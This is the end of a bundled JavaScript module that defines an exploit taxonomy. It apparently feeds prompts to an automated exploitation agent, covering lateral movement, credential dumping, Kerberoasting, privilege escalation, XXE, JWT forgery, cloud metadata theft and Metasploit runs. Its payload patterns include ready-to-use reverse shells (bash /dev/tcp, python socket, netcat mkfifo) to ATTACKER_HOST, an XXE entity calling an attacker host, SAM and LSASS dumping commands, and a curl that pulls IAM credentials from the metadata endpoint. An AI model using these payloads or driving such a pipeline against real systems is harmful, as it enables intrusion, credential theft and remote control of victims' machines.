        payloadPatterns: ["RFB auth bypass", "VNC brute force"],
        successIndicators: ["EXPLOIT_SUCCESS", "auth.*bypass", "session.*opened"],
        failureIndicators: ["EXPLOIT_FAILED", "auth.*failed"],
        canAchieveShell: true,
        shellEscalationPath: "VNC access \u2192 desktop control \u2192 open terminal \u2192 shell",
        targetServices: ["vnc"],
        targetPorts: [5900, 5901, 5902],
        riskLevel: 7,
        defaultTimeout: 60,
        tags: ["remote_access", "brute_force"]
      },
      // ── Lateral Movement ────────────────────────────────────────────────────
      {
        category: "lateral_movement_smb",
        name: "SMB Lateral Movement",
        description: "Move laterally via SMB using pass-the-hash, psexec, smbexec, or wmiexec. Requires valid credentials or NTLM hash.",
        mitreTechniques: ["T1021.002", "T1550.002"],
        cweIds: ["CWE-287"],
        primaryMethod: "cli_tool",
        alternativeMethods: ["python_script"],
        tools: [
          { name: "impacket", category: "python_lib", verifyCommand: "python3 -c 'import impacket'", installCommand: "pip3 install impacket", required: true },
          { name: "crackmapexec", category: "system_binary", verifyCommand: "which crackmapexec || which cme", installCommand: "pip3 install crackmapexec 2>/dev/null || pip3 install netexec", required: false, alternatives: ["smbclient"] },
          { name: "smbclient", category: "system_binary", verifyCommand: "which smbclient", installCommand: "apt-get install -y smbclient", required: false }
        ],
        pythonLibs: ["impacket"],
        payloadPatterns: [
          "psexec.py DOMAIN/user:password@TARGET",
          "wmiexec.py DOMAIN/user:password@TARGET",
          "smbexec.py DOMAIN/user@TARGET -hashes :NTLM_HASH"
        ],
        successIndicators: ["EXPLOIT_SUCCESS", "C:\\Windows", "nt authority\\system"],
        failureIndicators: ["EXPLOIT_FAILED", "STATUS_LOGON_FAILURE", "access.*denied"],
        canAchieveShell: true,
        shellEscalationPath: "Valid creds/hash \u2192 psexec/wmiexec \u2192 SYSTEM shell",
        targetServices: ["smb", "microsoft-ds"],
        targetPorts: [445, 139],
        riskLevel: 8,
        defaultTimeout: 60,
        tags: ["lateral_movement", "windows", "smb", "pass_the_hash"]
      },
      {
        category: "credential_dumping",
        name: "Credential Dumping",
        description: "Extract credentials from memory (LSASS), registry (SAM), or cached credentials. Requires elevated privileges on the target.",
        mitreTechniques: ["T1003.001", "T1003.002", "T1003.003"],
        cweIds: ["CWE-522"],
        primaryMethod: "python_script",
        alternativeMethods: ["cli_tool", "metasploit"],
        tools: [
          { name: "impacket", category: "python_lib", verifyCommand: "python3 -c 'import impacket'", installCommand: "pip3 install impacket", required: true },
          { name: "crackmapexec", category: "system_binary", verifyCommand: "which crackmapexec || which cme", installCommand: "pip3 install crackmapexec 2>/dev/null || pip3 install netexec", required: false }
        ],
        pythonLibs: ["impacket"],
        payloadPatterns: [
          "secretsdump.py DOMAIN/user:password@TARGET",
          "crackmapexec smb TARGET -u user -p password --sam"
        ],
        successIndicators: ["EXPLOIT_SUCCESS", "NTLM", "Administrator:500:", "aad3b435"],
        failureIndicators: ["EXPLOIT_FAILED", "access.*denied", "insufficient.*privileges"],
        canAchieveShell: false,
        targetServices: ["smb", "ldap"],
        targetPorts: [445, 389, 636],
        riskLevel: 9,
        defaultTimeout: 120,
        tags: ["post_exploitation", "credentials", "windows"]
      },
      {
        category: "kerberoasting",
        name: "Kerberoasting",
        description: "Request TGS tickets for service accounts and crack them offline. Requires domain user credentials. Targets accounts with SPNs set.",
        mitreTechniques: ["T1558.003"],
        cweIds: ["CWE-916"],
        primaryMethod: "python_script",
        alternativeMethods: ["cli_tool"],
        tools: [
          { name: "impacket", category: "python_lib", verifyCommand: "python3 -c 'import impacket'", installCommand: "pip3 install impacket", required: true },
          { name: "hashcat", category: "system_binary", verifyCommand: "which hashcat", installCommand: "apt-get install -y hashcat", required: false, alternatives: ["john"] },
          { name: "john", category: "system_binary", verifyCommand: "which john", installCommand: "apt-get install -y john", required: false }
        ],
        pythonLibs: ["impacket"],
        payloadPatterns: [
          "GetUserSPNs.py DOMAIN/user:password -dc-ip DC_IP -request",
          "hashcat -m 13100 hashes.txt wordlist.txt"
        ],
        successIndicators: ["EXPLOIT_SUCCESS", "\\$krb5tgs\\$", "ServicePrincipalName"],
        failureIndicators: ["EXPLOIT_FAILED", "no.*entries.*found", "KDC_ERR"],
        canAchieveShell: false,
        targetServices: ["kerberos", "ldap"],
        targetPorts: [88, 389, 636],
        riskLevel: 7,
        defaultTimeout: 120,
        tags: ["active_directory", "credentials", "windows"]
      },
      // ── Privilege Escalation ────────────────────────────────────────────────
      {
        category: "privilege_escalation_linux",
        name: "Linux Privilege Escalation",
        description: "Escalate from low-privilege shell to root. Check SUID binaries, sudo misconfigurations, kernel exploits, cron jobs, writable paths, capabilities.",
        mitreTechniques: ["T1068", "T1548.001", "T1548.003"],
        cweIds: ["CWE-269"],
        primaryMethod: "bash_script",
        alternativeMethods: ["python_script"],
        tools: [
          { name: "linpeas", category: "custom_script", verifyCommand: "test -f /tmp/linpeas.sh", installCommand: "curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh", required: false },
          { name: "pspy", category: "custom_script", verifyCommand: "test -f /tmp/pspy64", installCommand: "curl -sL https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64 -o /tmp/pspy64 && chmod +x /tmp/pspy64", required: false }
        ],
        pythonLibs: [],
        payloadPatterns: [
          "find / -perm -4000 -type f 2>/dev/null",
          "sudo -l",
          "cat /etc/crontab",
          "getcap -r / 2>/dev/null"
        ],
        successIndicators: ["root", "uid=0", "EXPLOIT_SUCCESS"],
        failureIndicators: ["EXPLOIT_FAILED", "permission.*denied", "not.*permitted"],
        canAchieveShell: true,
        shellEscalationPath: "Low-priv shell \u2192 enumerate (linpeas/manual) \u2192 exploit SUID/sudo/kernel \u2192 root shell",
        targetServices: ["ssh"],
        targetPorts: [22],
        riskLevel: 8,
        defaultTimeout: 120,
        tags: ["privesc", "linux", "post_exploitation"]
      },
      {
        category: "privilege_escalation_windows",
        name: "Windows Privilege Escalation",
        description: "Escalate from standard user to SYSTEM/Administrator. Check service misconfigurations, unquoted paths, token impersonation, UAC bypass, kernel exploits.",
        mitreTechniques: ["T1068", "T1134.001", "T1548.002"],
        cweIds: ["CWE-269"],
        primaryMethod: "powershell_script",
        alternativeMethods: ["python_script", "metasploit"],
        tools: [
          { name: "winpeas", category: "custom_script", verifyCommand: "test -f /tmp/winPEASx64.exe", installCommand: "curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe -o /tmp/winPEASx64.exe", required: false }
        ],
        pythonLibs: ["impacket"],
        payloadPatterns: [
          "whoami /priv",
          "wmic service get name,pathname,startmode",
          "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer"
        ],
        successIndicators: ["nt authority\\system", "EXPLOIT_SUCCESS", "Administrator"],
        failureIndicators: ["EXPLOIT_FAILED", "access.*denied"],
        canAchieveShell: true,
        shellEscalationPath: "Standard user \u2192 enumerate (winpeas/manual) \u2192 exploit service/token/kernel \u2192 SYSTEM shell",
        targetServices: ["smb", "rdp", "winrm"],
        targetPorts: [445, 3389, 5985, 5986],
        riskLevel: 8,
        defaultTimeout: 120,
        tags: ["privesc", "windows", "post_exploitation"]
      },
      // ── Deserialization & Advanced ──────────────────────────────────────────
      {
        category: "deserialization",
        name: "Insecure Deserialization",
        description: "Exploit unsafe deserialization in Java (ysoserial), PHP (phpggc), Python (pickle), .NET (ysoserial.net). Direct path to RCE via gadget chains.",
        mitreTechniques: ["T1059", "T1190"],
        cweIds: ["CWE-502"],
        primaryMethod: "python_script",
        alternativeMethods: ["cli_tool", "bash_script"],
        tools: [
          { name: "ysoserial", category: "custom_script", verifyCommand: "test -f /opt/ysoserial/ysoserial-all.jar || which ysoserial", installCommand: "mkdir -p /opt/ysoserial && curl -sL https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar -o /opt/ysoserial/ysoserial-all.jar 2>/dev/null || true", required: false },
          { name: "requests", category: "python_lib", verifyCommand: "python3 -c 'import requests'", installCommand: "pip3 install requests", required: true }
        ],
        pythonLibs: ["requests", "pickle", "base64"],
        payloadPatterns: [
          "java -jar ysoserial.jar CommonsCollections1 'REVERSE_SHELL'",
          "import pickle; pickle.loads(malicious_data)"
        ],
        successIndicators: ["EXPLOIT_SUCCESS", "uid=", "shell.*opened"],
        failureIndicators: ["EXPLOIT_FAILED", "ClassNotFoundException", "unserialize.*failed"],
        canAchieveShell: true,
        shellEscalationPath: "Deserialize malicious object \u2192 gadget chain triggers Runtime.exec/os.system \u2192 reverse shell",
        targetServices: ["http", "https", "rmi", "jmx"],
        targetPorts: [80, 443, 8080, 1099, 9999],
        riskLevel: 9,
        defaultTimeout: 90,
        tags: ["web", "rce", "advanced"]
      },
      {
        category: "xxe",
        name: "XML External Entity Injection",
        description: "Inject external entity references in XML input to read files, perform SSRF, or achieve RCE via expect:// wrapper.",
        mitreTechniques: ["T1190", "T1005"],
        cweIds: ["CWE-611"],
        primaryMethod: "python_script",
        alternativeMethods: ["curl_chain"],
        tools: [
          { name: "requests", category: "python_lib", verifyCommand: "python3 -c 'import requests'", installCommand: "pip3 install requests", required: true }
        ],
        pythonLibs: ["requests"],
        payloadPatterns: [
          '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
          '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://ATTACKER_HOST/xxe">]><foo>&xxe;</foo>'
        ],
        successIndicators: ["root:x:", "EXPLOIT_SUCCESS", "file.*content"],
        failureIndicators: ["EXPLOIT_FAILED", "entity.*not.*allowed", "DTD.*disabled"],
        canAchieveShell: true,
        shellEscalationPath: "XXE \u2192 read sensitive files \u2192 find credentials \u2192 authenticate \u2192 shell, or XXE \u2192 expect:// \u2192 direct RCE",
        targetServices: ["http", "https"],
        targetPorts: [80, 443, 8080],
        riskLevel: 8,
        defaultTimeout: 60,
        tags: ["web", "xml", "file_read"]
      },
      // ── API & Modern Web ───────────────────────────────────────────────────
      {
        category: "jwt_attack",
        name: "JWT Token Attack",
        description: "Exploit weak JWT implementations: none algorithm, weak secret brute force, key confusion (RS256\u2192HS256), kid injection.",
        mitreTechniques: ["T1078", "T1550.001"],
        cweIds: ["CWE-347"],
        primaryMethod: "python_script",
        alternativeMethods: ["cli_tool"],
        tools: [
          { name: "PyJWT", category: "python_lib", verifyCommand: "python3 -c 'import jwt'", installCommand: "pip3 install PyJWT", required: true },
          { name: "jwt_tool", category: "python_lib", verifyCommand: "which jwt_tool || python3 -c 'import jwt_tool'", installCommand: "pip3 install jwt-tool 2>/dev/null || true", required: false }
        ],
        pythonLibs: ["PyJWT", "requests", "hmac", "hashlib"],
        payloadPatterns: [
          '{"alg":"none","typ":"JWT"}',
          "jwt_tool TOKEN -X a",
          "hashcat -m 16500 jwt.txt wordlist.txt"
        ],
        successIndicators: ["EXPLOIT_SUCCESS", "forged.*token", "admin.*access"],
        failureIndicators: ["EXPLOIT_FAILED", "invalid.*signature", "token.*expired"],
        canAchieveShell: false,
        targetServices: ["http", "https"],
        targetPorts: [80, 443, 8080, 3e3],
        riskLevel: 7,
        defaultTimeout: 60,
        tags: ["web", "api", "auth", "token"]
      },
      {
        category: "idor",
        name: "Insecure Direct Object Reference",
        description: "Access unauthorized resources by manipulating object identifiers (IDs, filenames, UUIDs) in API requests.",
        mitreTechniques: ["T1078"],
        cweIds: ["CWE-639"],
        primaryMethod: "python_script",
        alternativeMethods: ["curl_chain"],
        tools: [
          { name: "requests", category: "python_lib", verifyCommand: "python3 -c 'import requests'", installCommand: "pip3 install requests", required: true }
        ],
        pythonLibs: ["requests"],
        payloadPatterns: [
          "/api/users/1 \u2192 /api/users/2",
          "/api/orders/100 \u2192 /api/orders/101"
        ],
        successIndicators: ["EXPLOIT_SUCCESS", "unauthorized.*data", "other.*user"],
        failureIndicators: ["EXPLOIT_FAILED", "forbidden", "not.*found"],
        canAchieveShell: false,
        targetServices: ["http", "https"],
        targetPorts: [80, 443, 8080, 3e3],
        riskLevel: 6,
        defaultTimeout: 30,
        tags: ["web", "api", "authorization"]
      },
      // ── Metasploit & External ──────────────────────────────────────────────
      {
        category: "metasploit_module",
        name: "Metasploit Framework Module",
        description: "Execute a known Metasploit module against the target. Generates an MSF resource script that can be run non-interactively.",
        mitreTechniques: ["T1190", "T1210"],
        cweIds: [],
        primaryMethod: "metasploit",
        alternativeMethods: ["python_script"],
        tools: [
          { name: "msfconsole", category: "system_binary", verifyCommand: "which msfconsole", installCommand: "echo 'Metasploit must be pre-installed'", required: true },
          { name: "msfvenom", category: "system_binary", verifyCommand: "which msfvenom", installCommand: "echo 'Metasploit must be pre-installed'", required: false }
        ],
        pythonLibs: [],
        payloadPatterns: [
          "use exploit/MODULE; set RHOSTS TARGET; set RPORT PORT; set LHOST ATTACKER_HOST; set LPORT ATTACKER_PORT; exploit"
        ],
        successIndicators: ["Meterpreter.*session.*opened", "Command.*shell.*session", "EXPLOIT_SUCCESS"],
        failureIndicators: ["Exploit.*completed.*but.*no.*session", "EXPLOIT_FAILED"],
        canAchieveShell: true,
        shellEscalationPath: "MSF module \u2192 Meterpreter/shell session",
        targetServices: ["any"],
        targetPorts: [],
        riskLevel: 8,
        defaultTimeout: 120,
        tags: ["metasploit", "framework", "automated"]
      },
      {
        category: "exploitdb_poc",
        name: "ExploitDB Proof of Concept",
        description: "Download and execute a public PoC from ExploitDB. May require modification for the target environment.",
        mitreTechniques: ["T1190", "T1210"],
        cweIds: [],
        primaryMethod: "python_script",
        alternativeMethods: ["bash_script"],
        tools: [
          { name: "searchsploit", category: "system_binary", verifyCommand: "which searchsploit", installCommand: "apt-get install -y exploitdb 2>/dev/null || true", required: false },
          { name: "requests", category: "python_lib", verifyCommand: "python3 -c 'import requests'", installCommand: "pip3 install requests", required: true }
        ],
        pythonLibs: ["requests"],
        payloadPatterns: ["searchsploit -m EXPLOIT_ID", "python3 exploit.py TARGET PORT"],
        successIndicators: ["EXPLOIT_SUCCESS", "shell.*opened", "uid="],
        failureIndicators: ["EXPLOIT_FAILED", "not.*vulnerable", "patched"],
        canAchieveShell: true,
        shellEscalationPath: "Download PoC \u2192 modify for target \u2192 execute \u2192 shell",
        targetServices: ["any"],
        targetPorts: [],
        riskLevel: 7,
        defaultTimeout: 120,
        tags: ["exploitdb", "poc", "public"]
      },
      {
        category: "custom_cve_exploit",
        name: "Custom CVE Exploit",
        description: "Generate a custom exploit script for a specific CVE based on vulnerability details, affected versions, and known attack vectors.",
        mitreTechniques: ["T1190", "T1210"],
        cweIds: [],
        primaryMethod: "python_script",
        alternativeMethods: ["bash_script", "ruby_script"],
        tools: [
          { name: "requests", category: "python_lib", verifyCommand: "python3 -c 'import requests'", installCommand: "pip3 install requests", required: true },
          { name: "pwntools", category: "python_lib", verifyCommand: "python3 -c 'import pwn'", installCommand: "pip3 install pwntools", required: false }
        ],
        pythonLibs: ["requests", "socket", "struct"],
        payloadPatterns: [],
        successIndicators: ["EXPLOIT_SUCCESS", "shell.*opened", "uid="],
        failureIndicators: ["EXPLOIT_FAILED", "not.*vulnerable"],
        canAchieveShell: true,
        shellEscalationPath: "CVE-specific exploit \u2192 target vulnerable version \u2192 RCE \u2192 shell",
        targetServices: ["any"],
        targetPorts: [],
        riskLevel: 8,
        defaultTimeout: 120,
        tags: ["cve", "custom", "targeted"]
      },
      // ── Cloud & Container ──────────────────────────────────────────────────
      {
        category: "cloud_misconfiguration",
        name: "Cloud Misconfiguration Exploitation",
        description: "Exploit misconfigured cloud services: open S3 buckets, exposed metadata endpoints, overly permissive IAM roles, public databases.",
        mitreTechniques: ["T1530", "T1552.005", "T1190"],
        cweIds: ["CWE-284"],
        primaryMethod: "python_script",
        alternativeMethods: ["cli_tool", "curl_chain"],
        tools: [
          { name: "aws", category: "system_binary", verifyCommand: "which aws", installCommand: "pip3 install awscli", required: false },
          { name: "s3scanner", category: "system_binary", verifyCommand: "which s3scanner", installCommand: "pip3 install s3scanner 2>/dev/null || true", required: false },
          { name: "boto3", category: "python_lib", verifyCommand: "python3 -c 'import boto3'", installCommand: "pip3 install boto3", required: false }
        ],
        pythonLibs: ["requests", "boto3"],
        payloadPatterns: [
          "aws s3 ls s3://BUCKET --no-sign-request",
          "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/"
        ],
        successIndicators: ["EXPLOIT_SUCCESS", "AccessKeyId", "SecretAccessKey", "bucket.*listing"],
        failureIndicators: ["EXPLOIT_FAILED", "AccessDenied", "NoSuchBucket"],
        canAchieveShell: false,
        targetServices: ["http", "https"],
        targetPorts: [80, 443],
        riskLevel: 7,
        defaultTimeout: 60,
        tags: ["cloud", "aws", "azure", "gcp", "misconfiguration"]
      },
      // ── Reverse Shell & C2 ─────────────────────────────────────────────────
      {
        category: "reverse_shell",
        name: "Reverse Shell Deployment",
        description: "Deploy a reverse shell payload to establish interactive command access. Used as the final step in most exploitation chains.",
        mitreTechniques: ["T1059", "T1071"],
        cweIds: [],
        primaryMethod: "bash_script",
        alternativeMethods: ["python_script", "powershell_script"],
        tools: [
          { name: "nc", category: "system_binary", verifyCommand: "which nc || which ncat", installCommand: "apt-get install -y netcat-openbsd ncat", required: true, alternatives: ["ncat", "socat"] },
          { name: "socat", category: "system_binary", verifyCommand: "which socat", installCommand: "apt-get install -y socat", required: false }
        ],
        pythonLibs: ["socket", "subprocess", "os"],
        payloadPatterns: [
          "bash -i >& /dev/tcp/ATTACKER_HOST/ATTACKER_PORT 0>&1",
          `python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_HOST",ATTACKER_PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`,
          "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_HOST ATTACKER_PORT >/tmp/f"
        ],
        successIndicators: ["session.*opened", "shell.*spawned", "uid=", "whoami"],
        failureIndicators: ["connection.*refused", "timeout", "no.*route"],
        canAchieveShell: true,
        targetServices: ["any"],
        targetPorts: [],
        riskLevel: 9,
        defaultTimeout: 30,
        tags: ["shell", "post_exploitation", "access"]
      }
    ];
  }
});

export {
  EXPLOIT_TYPE_TAXONOMY,
  buildToolRegistry,
  provisionForExploit,
  classifyVulnerability,
  buildExploitTypeContext,
  buildTaxonomySummaryForPrompt,
  formatProvisionReportForPrompt,
  init_exploit_tooling_framework
};
